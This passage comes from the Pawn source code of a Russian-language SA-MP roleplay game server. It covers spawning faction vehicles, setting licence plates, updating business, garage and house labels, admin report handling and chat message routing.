	tambcar[5] = AddStaticVehicle(409,1947.58830,2160.40478,15.472859,90.0,0,0); // Майбах (1) ОПГ Тамбовское
// tambcar[6] = AddStaticVehicle(521,-2817.6687,-666.5838,7.9175,52.4736,229,229); // мотик (2) ОПГ Тамбовское
// tambcar[7] = AddStaticVehicle(521,-2817.8735,-664.6528,7.7470,56.5623,229,229); // мотик (3) ОПГ ТАмбовское
//==================================================Итальянская Мафия=============================================
	tombcar[0] = AddStaticVehicle(421,1932.85412,2170.26831,15.472859,270.0,0,0); // кабан (1) ОПГ Тамбовское
	tombcar[1] = AddStaticVehicle(421,1932.85412,2173.71948,15.472859,270.0,0,0); // кабан (2) ОПГ Тамбовское
	tombcar[2] = AddStaticVehicle(579,1947.08654,2167.95336,15.472859,90.0,0,0); // Гелик ОПГ Тамбовское
	tombcar[3] = AddStaticVehicle(579,1947.39270,2164.20581,15.472859,90.0,0,0); // Гелик (1) ОПГ Тамбовское
	tombcar[4] = AddStaticVehicle(418,1952.36980,2172.81201,15.472859,90.0,0,0); // Спринер ОПГ Тамбовское
	tombcar[5] = AddStaticVehicle(409,1947.58830,2160.40478,15.472859,90.0,0,0); // Майбах (1) ОПГ Тамбовское
//==================================================Русская Мафия=============================================
	rmcar[0] = AddStaticVehicle(588,1973.1549,-1928.5522,31.9411,359.6032,17,17); // Audi Q7
	rmcar[1] = AddStaticVehicle(588,1977.0555,-1928.5884,31.9414,358.4186,17,17); //Audi Q7
	rmcar[2] = AddStaticVehicle(547,1980.9841,-1928.7853,31.7036,359.1835,17,17); // Audi 80
	rmcar[3] = AddStaticVehicle(547,1984.8313,-1928.8274,31.7028,359.0077,17,17); // Audi 80
	rmcar[4] = AddStaticVehicle(415,1988.8966,-1928.5685,31.9060,0.6632,17,17); // Audi RS7
	rmcar[5] = AddStaticVehicle(418,1993.1626,-1928.0723,31.7572,0.6405,17,17); // Спринер
// rmcar[6] = AddStaticVehicle(536,448.6154,-1252.6980,40.4564,341.2383,3,3); // Шкода 1
// rmcar[7] = AddStaticVehicle(536,446.6917,-1258.2502,40.4609,341.2463,3,3); // Шкода 2
//==================================================Правительство==============================================
	pravocar[0] = AddStaticVehicle(482,1787.1753,2070.3640,15.9933,269.2842,1,1); // гелик Правительство
	pravocar[1] = AddStaticVehicle(482,1787.0873,2078.0549,15.9954,268.5924,1,1); // гелик Правительство
	pravocar[2] = AddStaticVehicle(482,1787.0145,2085.9646,15.9951,270.4431,1,1); // гелик Правительство
	pravocar[3] = AddStaticVehicle(409,1786.6945,2093.6167,15.5038,272.8945,1,1); // Майбах Правительство
	pravocar[4] = AddStaticVehicle(600,1786.8937,2101.3389,15.6339,271.3192,1,1); // бэха F01 Правительство
	pravocar[5] = AddStaticVehicle(600,1786.9182,2109.3254,15.6340,270.9831,1,1); // бэха F01 Правительство
	pravocar[6] = AddStaticVehicle(600,1786.8589,2116.9561,15.6339,271.7220,1,1); // бэха F01 Правительство
//===============================================Мин.Обороны==========================================================
	armycar[0] = CreateVehicleEx(578,12.3402,2928.2832,7.9717,2.1236,1,1,780); // 1 Урал
	armycar[1] = CreateVehicleEx(578,4.8748,2927.9080,7.9711,1.8135,1,1,780); // 2 Урал
	armycar[2] = CreateVehicleEx(578,-3.1856,2927.4895,7.9809,0.4013,1,1,780); // 3 Урал
	armycar[3] = CreateVehicleEx(578,-36.9441,2924.4104,8.0773,2.1236,1,1,780); // 4 Урал
	armycar[4] = CreateVehicleEx(578,-30.1086,2925.2083,8.0841,2.1236,1,1,780); // 5 Урал
	armycar[5] = CreateVehicleEx(578,22.4070,2924.3792,8.0798,2.1236,1,1,780); // 6 Урал
	armycar[6] = CreateVehicleEx(470,4.1207,2900.9678,24.0106,181.0967,1,1,780); // 1 Тигр
	armycar[7] = CreateVehicleEx(470,-1.0058,2900.8945,24.0136,181.3446,1,1,780); // 2 Тигр
	armycar[8] = CreateVehicleEx(470,-7.0805,2900.8489,24.0127,181.0591,1,1,780); // 3 Тигр
	armycar[9] = CreateVehicleEx(470,-13.4432,2900.9106,24.0126,180.7911,1,1,780); // 4 Тигр
	armycar[10] = CreateVehicleEx(470,52.6579,2907.8225,24.0129,179.4816,1,1,780); // 5 Тигр
	armycar[11] = CreateVehicleEx(470,13.9992,2906.0803,24.0139,179.7042,1,1,780); // 6 Тигр
	armycar[12] = CreateVehicleEx(490,30.0392,2905.4944,23.9692,176.5298,234,1,780); // 1 Кадилак
	armycar[13] = CreateVehicleEx(490,35.3811,2905.6943,23.9669,177.6639,234,1,780); // 2 Кадилак
	armycar[14] = CreateVehicleEx(483,-42.8951,2904.9802,24.6247,180.1800,234,1,780); // 1 автобус
	armycar[15] = CreateVehicleEx(483,-32.1921,2905.5696,24.6250,179.7078,234,1,780); // 2 автобус
	armycar[16] = CreateVehicleEx(466,138.0755,2866.5244,23.8367,89.0721,234,1,780); // 1 Бэха
	armycar[17] = CreateVehicleEx(466,128.9166,2866.6729,23.8400,89.0721,234,1,780); // 2 Бэха
	armycar[18] = CreateVehicleEx(425,135.1573,2901.5896,31.5891,177.7655,1,1,780); // вертолет 1
	armycar[19] = CreateVehicleEx(425,158.5275,2900.6467,31.5887,178.9799,1,1,780); // вертолет 2
	armycar[20] = CreateVehicleEx(548,198.8804,2927.3000,31.2942,272.3130,1,1,780); // 1 верт
	armycar[21] = CreateVehicleEx(548,199.8092,2902.9663,31.2492,271.8614,1,1,780); // 2 верт
	armycar[22] = CreateVehicleEx(601,48.0482,2857.2454,24.3436,116.6311,1,1,780); // 1 БТР
	armycar[23] = CreateVehicleEx(601,196.0029,2970.5894,24.2909,182.1017,1,1,780); // 2 БТР
//=================MEDICCAR=================
	mediccar[0] = CreateVehicleEx(416,456.9465,1507.7251,12.2175,359.6712,18,18,780); // CAR1
	mediccar[1] = CreateVehicleEx(416,453.5288,1507.6526,12.2164,359.5280,18,18,780); // CAR2
	mediccar[2] = CreateVehicleEx(416,450.0945,1507.6564,12.2218,359.9753,18,18,780); // CAR3
	mediccar[3] = CreateVehicleEx(416,446.3957,1507.6394,12.2177,359.7003,18,18,780); // CAR4
	mediccar[4] = CreateVehicleEx(416,443.0159,1507.6731,12.2187,0.1171,18,18,780); // CAR5
	mediccar[5] = CreateVehicleEx(416,439.5905,1507.5983,12.2161,359.6172,18,18,780); // CAR6
	mediccar[6] = CreateVehicleEx(416,436.1077,1507.5605,12.2177,0.6490,18,18,780); // CAR7
	mediccar[7] = CreateVehicleEx(567,432.6071,1507.6835,11.7851,359.6242,18,18,780); // CAR12
	mediccar[8] = CreateVehicleEx(567,428.9048,1507.5989,11.7858,359.6911,18,18,780); // CAR13
	mediccar[9] = CreateVehicleEx(567,425.4807,1507.5785,11.7411,359.9789,18,18,780); // CAR14

    buscar[0] = AddStaticVehicleEx(431,761.5038,722.5701,12.2119,248.2841,7,7, 100); // 1  avtobus
	AddStaticVehicleEx(431,759.7937,718.1292,12.1675,248.6348,7,7, 100); // 2  avtobus
	AddStaticVehicleEx(431,758.1273,713.6371,12.1387,248.0967,7,7, 100); // 3  avtobus
	AddStaticVehicleEx(431,756.3965,709.1102,12.1119,248.1415,7,7, 100); // 4  avtobus
	AddStaticVehicleEx(431,754.6724,704.6534,12.0967,249.2623,3,3, 100); // 5  avtobus
	AddStaticVehicleEx(431,752.7794,700.6089,12.0887,250.3885,3,3, 100); // 6 avtobus
	AddStaticVehicleEx(431,751.1026,695.5830,12.0876,249.4904,3,3, 100); // 7 avtobus
	AddStaticVehicleEx(431,749.2578,690.5680,12.0872,248.9336,3,3, 100); // 8 avtobus
	AddStaticVehicleEx(431,747.2587,685.1935,12.0872,249.3322,2,2, 100); // 9 avtobus
	AddStaticVehicleEx(431,745.3418,679.8407,12.0881,249.7456,2,2, 100); // 10 avtobus
	AddStaticVehicleEx(431,743.4501,674.7084,12.0871,248.7266,2,2, 100); // 11 avtobus
	AddStaticVehicleEx(431,741.5320,669.7899,12.0871,249.2736,5,5, 100); // 12 avtobus
	AddStaticVehicleEx(431,739.5987,664.5131,12.0867,248.8910,5,5, 100); // 13 avtobus
	buscar[1] = AddStaticVehicleEx(431,737.6782,659.1977,12.0874,248.8902,5,5, 100); // 14 avtobus



	AutoCar[0] = AddStaticVehicleEx(540, 1924.1863,2228.1321,15.5777,0.5754,3,3,200);
    AddStaticVehicleEx(540, 1932.9685,2250.5112,15.5810,90.9401,3,3,200);
    AddStaticVehicleEx(540, 1928.5447,2225.1567,15.5764,1.0008,3,3,200);
    AddStaticVehicleEx(540, 1932.6166,2225.2698,15.5771,2.2622,3,3,200);
    AutoCar[1] = AddStaticVehicleEx(540, 1939.9987,2247.7507,15.6547,89.4752,3,3,200);

    SetVehicleData(AutoCar[1], veh_health, 1000);
    //SetVehicleNumberPlate(armycar[0]);

	/*for(new i = 0; i < sizeof(ArendInfo); i ++)
	{
	    ArendInfo[i][aID] = AddStaticVehicleEx(ArendInfo[i][aModel], ArendInfo[i][aPos_X], ArendInfo[i][aPos_Y], ArendInfo[i][aPos_Z], ArendInfo[i][aPos_A], ArendInfo[i][aColor_1], ArendInfo[i][aColor_2], 100000);
        SetVehicleParamsEx(ArendInfo[i][aID], false, false, false, false, false, false, false);
	}*/

	taxicar[0] = AddStaticVehicleEx(420,199.0006,1267.0929,12.3558,80.0000,6,6, 100 ); // 1 такси
 	taxicar[1] = AddStaticVehicleEx(420,200.2245,1272.8870,12.3512,80.0000,6,6, 100); // 2 такси
	taxicar[2] = AddStaticVehicleEx(420,201.5011,1278.9691,12.3520,80.0000,6,6, 100); // 3 такси
	taxicar[3] = AddStaticVehicleEx(420,202.6915,1284.9506,12.3519,80.0000,6,6, 100); // 4 такси
	taxicar[4] = AddStaticVehicleEx(420,204.4118,1290.9762,12.3556,80.0000,6,6, 100); // 5 такси
	taxicar[5] = AddStaticVehicleEx(420,208.2988,1311.9758,12.3443,80.0000,6,6, 100); // 6 такси
	taxicar[6] = AddStaticVehicleEx(420,209.8841,1317.8889,12.3475,80.0000,6,6, 100); // 7 такси
	taxicar[7] = AddStaticVehicleEx(420,210.9264,1324.0399,12.3463,80.0000,6,6, 100); // 8 такси
	taxicar[8] = AddStaticVehicleEx(420,212.2147,1329.8386,12.3479,80.0000,6,6, 100); // 9 такси
	taxicar[9] = AddStaticVehicleEx(420,213.1622,1335.9014,12.3391,80.0000,6,6, 100); // 10 такси
	taxicar[10] = AddStaticVehicleEx(420,214.1637,1341.9742,12.3368,80.0000,6,6, 100); // 11 такси
	taxicar[11] = AddStaticVehicleEx(420,215.5148,1348.0923,12.3373,80.0000,6,6, 100); // 12 такси
	taxicar[12] = AddStaticVehicleEx(420,172.9143,1355.9935,12.0262,260.1133,6,6, 100); // 13 такси
	taxicar[13] = AddStaticVehicleEx(420,171.6989,1349.9188,12.0282,260.1133,6,6, 100); // 14 такси
	taxicar[14] = AddStaticVehicleEx(420,170.6884,1343.7883,12.0352,260.1133,6,6, 100); // 15 такси
	taxicar[15] = AddStaticVehicleEx(420,169.7387,1337.7905,12.0366,260.1133,6,6, 100); // 16 такси
	taxicar[16] = AddStaticVehicleEx(420,168.3237,1331.8187,12.0352,260.1133,6,6, 100); // 17 такси
	taxicar[17] = AddStaticVehicleEx(420,167.0622,1325.7745,12.3558,260.1133,6,6, 100); // 18 такси
	taxicar[18] = AddStaticVehicleEx(420,161.9083,1298.8313,12.3558,260.1133,6,6, 100); // 19 такси
	taxicar[19] = AddStaticVehicleEx(420,160.2541,1292.9476,12.3558,260.1133,6,6, 100); // 20 такси
	taxicar[20] = AddStaticVehicleEx(420,159.3930,1286.8243,12.3558,260.1133,6,6, 100); // 21 такси
	taxicar[21] = AddStaticVehicleEx(420,158.3856,1280.6324,12.3558,260.1133,6,6, 100); // 22 такси
	taxicar[22] = AddStaticVehicleEx(420,156.2245,1274.7305,12.3558,260.1133,6,6, 100); // 23 такси

	mechanic[0] = AddStaticVehicleEx(525,-431.5298,707.2219,12.1447,0.4548,1,1, 100); // 1 mechanic
	mechanic[1] = AddStaticVehicleEx(525,-427.4396,707.2787,12.1544,358.8691,1,1, 100); // 2 mechanic
	mechanic[2] = AddStaticVehicleEx(525,-423.4569,707.2057,12.1545,359.1780,1,1, 100); // 3 mechanic
	mechanic[3] = AddStaticVehicleEx(525,-419.4857,707.1714,12.1553,359.7128,1,1, 100); // 4 mechanic
	mechanic[4] = AddStaticVehicleEx(525,-415.4945,707.1230,12.1488,0.5352,1,1, 100); // 5 mechanic
	mechanic[5] = AddStaticVehicleEx(525,-411.3773,707.0651,12.1489,357.6359,1,1, 100); // 6 mechanic

	foreach(new i: Vehicle) SetVehicleData(i, veh_fuel, 100);
	/**************************************************************************/
	//for(new i; i < sizeof(PodarokInfo); i++) PodarokInfo[i][porCreat] = CreatePickup(19056,1,PodarokInfo[i][porPos][0], PodarokInfo[i][porPos][1], PodarokInfo[i][porPos][2],-1);
}

public OnOutcomingRPC(playerid, rpcid, BitStream:bs)
{
  if (rpcid == 123)
  {
    new vehicleid;
    //new number[144];
   	/*new slot = cache_get_field_content_int(0, "slot");
    new vehicle = PI[playerid][P_OWNABLE_CAR][slot - 1];*/
    BS_ReadValue(bs, PR_UINT16, vehicleid);
	SendVehicleNumberPlate(playerid, armycar[0], 1, "1111мо");
	SendVehicleNumberPlate(playerid, armycar[1], 1, "2222мо");
	SendVehicleNumberPlate(playerid, armycar[2], 1, "3333мо");
	SendVehicleNumberPlate(playerid, armycar[3], 1, "4444мо");
	SendVehicleNumberPlate(playerid, armycar[4], 1, "5555мо");
	SendVehicleNumberPlate(playerid, armycar[5], 1, "6666мо");
	SendVehicleNumberPlate(playerid, armycar[6], 1, "0110мо");
 	SendVehicleNumberPlate(playerid, armycar[7], 1, "0220мо");
    SendVehicleNumberPlate(playerid, armycar[8], 1, "0330мо");
    SendVehicleNumberPlate(playerid, armycar[9], 1, "0440мо");
    SendVehicleNumberPlate(playerid, armycar[10], 1, "0550мо");
    SendVehicleNumberPlate(playerid, armycar[11], 1, "0660мо");
    SendVehicleNumberPlate(playerid, armycar[12], 1, "0001мо");
    SendVehicleNumberPlate(playerid, armycar[13], 1, "0002мо");
    SendVehicleNumberPlate(playerid, armycar[14], 1, "8977мо");
    SendVehicleNumberPlate(playerid, armycar[15], 1, "8978мо");
    SendVehicleNumberPlate(playerid, armycar[16], 1, "1000мо");
    SendVehicleNumberPlate(playerid, armycar[17], 1, "2000мо");

    SendVehicleNumberPlate(playerid, taxicar[0], 3, "ур980 66");
    SendVehicleNumberPlate(playerid, taxicar[1], 3, "ук560 66");
    SendVehicleNumberPlate(playerid, taxicar[2], 3, "уд310 66");
    SendVehicleNumberPlate(playerid, taxicar[3], 3, "на740 66");

    SendVehicleNumberPlate(playerid, gibddcar[0], 3, "а9714 100");


	/*format(number, sizeof number, "%s%d%d%d%s%s%d%d", VehNumber(), random(9), random(9), random(9), VehNumber(), VehNumber(), random(9), random(9));
	SendVehicleNumberPlate(playerid, vehicle, 2, number);*/
	//=======================================================
	new string [124];
	format(string, sizeof string, "%s", g_vehicle[vehicleid][veh_number]);
	if(GetVehicleData(vehicleid,veh_type_num) == 2)
	{
		SendVehicleNumberPlate(playerid, vehicleid, 2, string);
	}
	if(GetVehicleData(vehicleid,veh_type_num) == 5)
	{
		SendVehicleNumberPlate(playerid, vehicleid, 5, string);
	}
	if(GetVehicleData(vehicleid,veh_type_num) == 6)
	{
		SendVehicleNumberPlate(playerid, vehicleid, 6, string);
	}
	if(GetVehicleData(vehicleid,veh_type_num) == 7)
	{
		SendVehicleNumberPlate(playerid, vehicleid, 7, string);
	}
    return 0;
  }
  return 1;
}

stock UpdateBizz(idx)
{
	new string[200],fee[64], status[32];
	if(BizzInfo[idx][bEnter] == 0) fee = "Вход свободный";
	else format(fee, sizeof(fee), "Стоимость входа: {FFFFFF}%dр", BizzInfo[idx][bEnter]);

	switch(BizzInfo[idx][bControl])
	{
	    case TEAM_YAK: status = "Якудза";
	    case TEAM_OPG1: status = "Итальянская Мафия";
	    case TEAM_RSM: status = "Русская Мафия";
		case 0: status = "Отсутствует";
	}

	if(BizzInfo[idx][bType] != 2 && BizzInfo[idx][bType] != 7)
	{
		if(!strcmp(BizzInfo[idx][bOwner],"None",true))
		{
			format(string, sizeof(string), "{63BD4E}Название: {FFFFFF}%s\n{63BD4E}Бизнес продаётся\n{63BD4E}Цена: {FFFFFF}%dр\n{63BD4E}Крышует: {FFFFFF}%s", BizzInfo[idx][bName], BizzInfo[idx][bPrice], status);
			UpdateDynamic3DTextLabelText(LABELBIZZ[idx],-1,string);
		}
		else
		{
			format(string, sizeof(string), "{63BD4E}Название: {FFFFFF}%s\n{63BD4E}Владелец: {FFFFFF}%s\n{63BD4E}%s\n{63BD4E}Крышует: {FFFFFF}%s", BizzInfo[idx][bName], BizzInfo[idx][bOwner], fee, status);
			UpdateDynamic3DTextLabelText(LABELBIZZ[idx],-1,string);
		}
	}
	else if(BizzInfo[idx][bType] == 2)
	{
		if(!strcmp(BizzInfo[idx][bOwner],"None",true))
		{
			format(string, sizeof(string), "{63BD4E}Название: {FFFFFF}%s\n{63BD4E}Заправка продаётся\n{63BD4E}Цена: {FFFFFF}%dр\n{63BD4E}Цена за 1 литр - {FFFFFF}%iр\n{63BD4E}Крышует: {FFFFFF}%s\n{bbbbbb}Для заправки используйте /fill", BizzInfo[idx][bName], BizzInfo[idx][bPrice], BizzInfo[idx][bTill], status);
			UpdateDynamic3DTextLabelText(LABELBIZZ[idx],-1,string);
		}
		else
		{
			format(string, sizeof(string), "{63BD4E}Название: {FFFFFF}%s\n{63BD4E}Владелец: {FFCD00}%s\n{63BD4E}Цена за 1 литр - {FFFFFF}%iр\n{63BD4E}Крышует: {FFFFFF}%s\n{bbbbbb}Для заправки используйте /fill", BizzInfo[idx][bName], BizzInfo[idx][bOwner], BizzInfo[idx][bTill], status);
			UpdateDynamic3DTextLabelText(LABELBIZZ[idx],-1,string);
		}
	}
	else if(BizzInfo[idx][bType] == 7)
	{
		if(!strcmp(BizzInfo[idx][bOwner],"None",true))
		{
			format(string, sizeof(string), "{63BD4E}Название: {FFFFFF}%s\n{63BD4E}СТО продаётся\n{63BD4E}Цена: {FFFFFF}%dр\n{63BD4E}Крышует: {FFFFFF}%s\n{63BD4E}Цена за 1 запчасть - {FFFFFF}%iр\n{bbbbbb}Используйте клавишу {FFFFFF}'H'", BizzInfo[idx][bName], BizzInfo[idx][bPrice], status, BizzInfo[idx][bTill]);
			UpdateDynamic3DTextLabelText(LABELBIZZ[idx],-1,string);
		}
		else
		{
			format(string, sizeof(string), "{63BD4E}Название: {FFFFFF}%s\n{63BD4E}Владелец: {FFFFFF}%s\n{63BD4E}Крышует: {FFFFFF}%s\n{63BD4E}Цена за 1 запчасть - {FFFFFF}%iр\n{bbbbbb}Используйте клавишу {FFFFFF}'H'",  BizzInfo[idx][bName], BizzInfo[idx][bOwner], status, BizzInfo[idx][bTill]);
			UpdateDynamic3DTextLabelText(LABELBIZZ[idx],-1,string);
		}
	}
	return 1;
}

stock UpdateGarage(idx)
{
	new fmt_text[120];

	DestroyDynamic3DTextLabel(g_garages[idx][G_LABEL]);

	new status = strcmp(g_garages[idx][G_OWNER], "None", true);

	format(fmt_text, sizeof fmt_text, "- Гараж №%d -\n%s\n{ffffff}Используйте «L.ALT» или «H»", g_garages[idx][G_SQL_ID], (!status) ? ("{66CC33}Продаётся") : ("{FF5533}Куплен"));

	g_garages[idx][G_LABEL] = CreateDynamic3DTextLabel(fmt_text, 0xFFCD00FF, g_garages[idx][G_POS_X], g_garages[idx][G_POS_Y], g_garages[idx][G_POS_Z] + 0.5, 15.0);
}

stock UpdateHouse(idx)
{
	DestroyDynamicMapIcon(HouseInfo[idx][hMIcon]);
	DestroyPickup(HouseInfo[idx][hPickup]);
	if(!strcmp(HouseInfo[idx][hOwner],"None",true))
	{
		HouseInfo[idx][hMIcon] = CreateDynamicMapIcon(HouseInfo[idx][hEntrx], HouseInfo[idx][hEntry], HouseInfo[idx][hEntrz], 31, 0,-1,-1,-1,150.0);
		HouseInfo[idx][hPickup] = CreatePickup(1273, 1, HouseInfo[idx][hEntrx], HouseInfo[idx][hEntry], HouseInfo[idx][hEntrz]);
	}
	else
	{
		HouseInfo[idx][hMIcon] = CreateDynamicMapIcon(HouseInfo[idx][hEntrx], HouseInfo[idx][hEntry], HouseInfo[idx][hEntrz], 32, 0,-1,-1,-1,150.0);
		HouseInfo[idx][hPickup] = CreatePickup(1272, 1, HouseInfo[idx][hEntrx], HouseInfo[idx][hEntry], HouseInfo[idx][hEntrz]);
	}
	return 1;
}

stock BuyCar(playerid)
{
	if(GetPlayerFines(playerid))
		return SendClientMessage(playerid, COLOR_RED, "У Вас есть неоплаченные штрафы. Оплатите их в любом банке. (/gps > 5)");

	if(!PI[playerid][pVip])
	{
		ShowPlayerDialog(playerid,16000,DIALOG_STYLE_LIST,"{F5E911}выберите действие:","\
		{ffffff}1. Заменить автомобиль в слоте #1\n\
		{ffffff}2. Заменить автомобиль в слоте #2\n\
		{ffffff}3. Заменить автомобиль в слоте #3","выбрать","Отмена");
	}
	else
	{
		ShowPlayerDialog(playerid,16000,DIALOG_STYLE_LIST,"{F5E911}выберите действие:","\
		{ffffff}1. Заменить автомобиль в слоте #1\n\
		{ffffff}2. Заменить автомобиль в слоте #2\n\
		{ffffff}3. Заменить автомобиль в слоте #3\n\
		{ffffff}4. Заменить автомобиль в слоте #4\n\
		{ffffff}5. Заменить автомобиль в слоте #5","выбрать","Отмена");
	}


	return 1;
}


stock BuyCloseCar(playerid)
{
	DestroyVehicle(PI[playerid][SalonCarID]);

	PI[playerid][SalonCarID] = INVALID_VEHICLE_ID;

	TogglePlayerControllable(playerid, true);

	for(new i = 0; i != sizeof autosalon_td; i ++)
		TextDrawHideForPlayer(playerid, autosalon_td[i]);

	PlayerTextDrawHide(playerid, autosalon_ptd_first[playerid]);
	PlayerTextDrawHide(playerid, autosalon_ptd_second[playerid]);

	CancelSelectTextDraw(playerid);

	new salon = PI[playerid][P_SALON];

	static Float: coord_exit_autosalon[][4] =
	{
		{-20.0971,531.3359,11.1021,349.8141},
		{2325.3313,-1828.9830,22.4614,91.7042},
		{1997.9536,2739.1497,12.2500,88.9852}
	};

	FreezePlayer(playerid, 3000);

	SetPlayerPos(playerid, coord_exit_autosalon[salon][0], coord_exit_autosalon[salon][1], coord_exit_autosalon[salon][2]);
	SetPlayerFacingAngle(playerid, coord_exit_autosalon[salon][3]);

	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid, 0);

	SetCameraBehindPlayer(playerid);

	InShop[playerid] = 0;

	pPressed[playerid] = 0;

	DeletePVar(playerid, "PlayerBizz");

	PI[playerid][P_SALON] = -1;

	/*if(global_info_status != 0)
	{
		for(new idx = 0; idx != sizeof global_info_td; idx ++)
			TextDrawShowForPlayer(playerid, global_info_td[idx]);
	}*/

	return 1;
}

stock SendSocMessage(color, str[])
{
	foreach(new i: Player)
	{
		if(!PlayerLogged[i]) continue;
		if(PI[i][pPhone][1] <= 0) continue;
		if(PI[i][pAdmin] == 0 && PI[i][pVip] == 0) continue;
		SendClientMessage(i, color, str);
	}
	return 1;
}

forward admin_reports_cleaner();
public admin_reports_cleaner()
{
    new total_cleaned_reports = 0;

    for(new i = 1; i < MAX_ADMIN_REPORTS; i++)
    {
        if(gReport[i][rPlayerID] == -1)
            continue;

        if(gettime() - gReport[i][rWhenWroted_Time] >= 10*60)
        {
            SendClientMessage(gReport[i][rPlayerID], COLOR_GREY, !"Ваше сообщение для администрации было удалено системой (долго нет ответа).");

            DeletePVar(gReport[i][rPlayerID], "report_id");

            gReport[i][rIsTooked] = false;
            gReport[i][rID] = i;
            gReport[i][rPlayerID] = -1;
            gReport[i][rText][0] = EOS;
            gReport[i][rWhenWroted_Time] = -1;
            gReport[i][rWhenWroted_Text][0] = EOS;

            total_cleaned_reports++;
        }
    }
    return 1;
}

stock ShowPlayerAdminReportList(playerid)
{
    static
        string[1048],
        total_admin_reports = 0;

	string[0] = '\0';
    for(new i = 1; i < MAX_ADMIN_REPORTS; i++)
    {
        if(gReport[i][rPlayerID] == -1) continue;
        format(string, sizeof(string), "%s{0080BB}%d. {FFFFFF}%s\t%s\n", string, i, gReport[i][rWhenWroted_Text], PI[gReport[i][rPlayerID]][pName]);
        total_admin_reports++;
    }
    if(total_admin_reports == 0)
        return SendClientMessage(playerid, COLOR_GREY, !"В данный момент нет сообщений администраторам от игроков сервера.");

    ShowPlayerDialog(playerid, 800, DIALOG_STYLE_LIST, "{0080BB}Список сообщений администраторам", string, "Выбрать", "Отмена");
    return 1;
}
stock ShowPlayerAdminReportAnswer(playerid, report_id)
{
    SetPVarInt(playerid, "report_id_to_answer", report_id);
    gReport[report_id][rIsTooked] = true;

	STRING_GLOBAL[0] = '\0';
	static const gText[] =
	{
		"{FFFFFF}Автор сообщения:{FF8C00}\t%s\n"\
		"{FFFFFF}Вопрос:\t\t{FF8C00}%s{FFFFFF}\n"\
		"{FFFFFF}Дата публикации:{FF8C00}\t%s\n"\
		"{FFFFFF}Пожалуйста, введите свой ответ в поле ниже"
	};

    format(STRING_GLOBAL, sizeof STRING_GLOBAL, gText, PI[gReport[report_id][rPlayerID]][pName], gReport[report_id][rText], gReport[report_id][rWhenWroted_Text]);
    ShowPlayerDialog(playerid, 801, DIALOG_STYLE_INPUT, "{0080BB}Просмотр сообщения администраторам", STRING_GLOBAL, "Ответить", "Удалить");
    return 1;
}


stock SendSupportMessage(color, str[], alogs = -1)
{
	foreach(new playerid: Admins)
	{
		if(alogs == -1)
		{
			if(!PlayerLogged[playerid]) continue;
			if(PI[playerid][pAdmin] == 1) SendClientMessage(playerid, color, str);
			else if(PI[playerid][pAdmin] >= 1 && GetPVarInt(playerid, "SupportChat") == 1) SendClientMessage(playerid, color, str);
		}
		else
		{
			if(AdminInfo[playerid][admAlog] == 1)
			{
				if(PI[playerid][pAdmin] == 1) SendClientMessage(playerid, color, str);
				else if(PI[playerid][pAdmin] >= 1 && GetPVarInt(playerid, "SupportChat") == 1) SendClientMessage(playerid, color, str);
			}
			else continue;
		}
	}
	return 1;
}

stock SendAdminMessage(color, str[], alogs = -1)
{
	foreach(new playerid: Admins)
	{
		if(alogs == -1)
		{
			if(!PlayerLogged[playerid]) continue;
			if(PI[playerid][pAdmin] >= 1) SendClientMessage(playerid, color, str);
		}
		else
		{
			if(AdminInfo[playerid][admAlog] == 1)
			{
				if(PI[playerid][pAdmin] >= 1) SendClientMessage(playerid, color, str);
			}
			else continue;
		}
	}
	return 1;
}

stock SendAdminMessageEx(color, str[], admin_level)
{
	foreach(new i: Player)
	{
		if(!PlayerLogged[i]) continue;
		if(PI[i][pAdmin] >= admin_level) SendClientMessage(i, color, str);
	}
	return 1;
}

stock SendAdminMessageToAll(color, const message[], exc = -1)
{
	foreach(new i: Player)
	{
		if(!PlayerLogged[i]) continue;
		if(Settings[i][1] == 0 || exc == i) SendClientMessage(i, color, message);
	}
}

stock SendDalnoMes(memberid, color, str[])
{
    foreach(new i: Player)
    {
        if(!PlayerLogged[i]) continue;
        if(PI[i][pJob] == JOB_TRUCK && i == memberid) SendClientMessage(i, color, str);
    }
    return 1;
}

stock SendFMes(memberid, color, str[])
{
	foreach(new i: Player)
	{
		if(!PlayerLogged[i]) continue;
		if(PI[i][pMember] == memberid && Settings[i][0] == 0) SendClientMessage(i, color, str);
		if(PI[i][P_LISTETING] == memberid)
		{
			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "[ПРОСЛУШИВАНИЕ] %s", str);
			SendClientMessage(i, color, STRING_GLOBAL);
		}
	}
	return 1;
}

stock SendDMes(color, str[])
{
	foreach(new i: Player)
	{
		if(!PlayerLogged[i]) continue;
		if(Settings[i][0] == 0)
		{
			if(PI[i][pMember] == TEAM_ARMIYA || IsAMedic(i) || IsAMayor(i) || IsACop(i) || PI[i][pMember] == TEAM_AUTOSCHOOL || IsANews(i)) SendClientMessage(i, color, str);
		}
	}
	return 1;
}

stock SendNMes(news, color, str[])
{
	foreach(new i: Player)
	{
		if(!PlayerLogged[i]) continue;
		if(PI[i][pNews] == news) SendClientMessage(i, color, str);
	}
	return 1;
}

stock ProxDetectorNew(playerid, Float:Radi = 10.0, color, text[])
{
	new Float:posx, Float:posy, Float:posz;
	GetPlayerPos(playerid, posx, posy, posz);
	foreach(new i: Player)
	{
		if(GetPlayerVirtualWorld(i) == GetPlayerVirtualWorld(playerid)
 		&& GetPlayerInterior(playerid) == GetPlayerInterior(i)
 		&& IsPlayerInRangeOfPoint(i, Radi, posx, posy, posz)) SendClientMessage(i, color, text);
	}
	return 1;
}

stock ProxDetector(Float:radi, playerid, str[],col1,col2,col3,col4,col5)
{
	new Float:posx, Float:posy, Float:posz, Float:oldposx, Float:oldposy,
		Float:oldposz, Float:tempposx, Float:tempposy, Float:tempposz;
	GetPlayerPos(playerid, oldposx, oldposy, oldposz);
	foreach(new i: Player)
	{
		if(PlayerLogged[i] == false) continue;
		GetPlayerPos(i, posx, posy, posz);
		tempposx = (oldposx -posx);
		tempposy = (oldposy -posy);
		tempposz = (oldposz -posz);
		if (((tempposx < radi/16) && (tempposx > -radi/16)) && ((tempposy < radi/16) && (tempposy > -radi/16)) && ((tempposz < radi/16) && (tempposz > -radi/16))) SendClientMessage(i, col1, str);
		else if (((tempposx < radi/8) && (tempposx > -radi/8)) && ((tempposy < radi/8) && (tempposy > -radi/8)) && ((tempposz < radi/8) && (tempposz > -radi/8))) SendClientMessage(i, col2, str);
		else if (((tempposx < radi/4) && (tempposx > -radi/4)) && ((tempposy < radi/4) && (tempposy > -radi/4)) && ((tempposz < radi/4) && (tempposz > -radi/4))) SendClientMessage(i, col3, str);
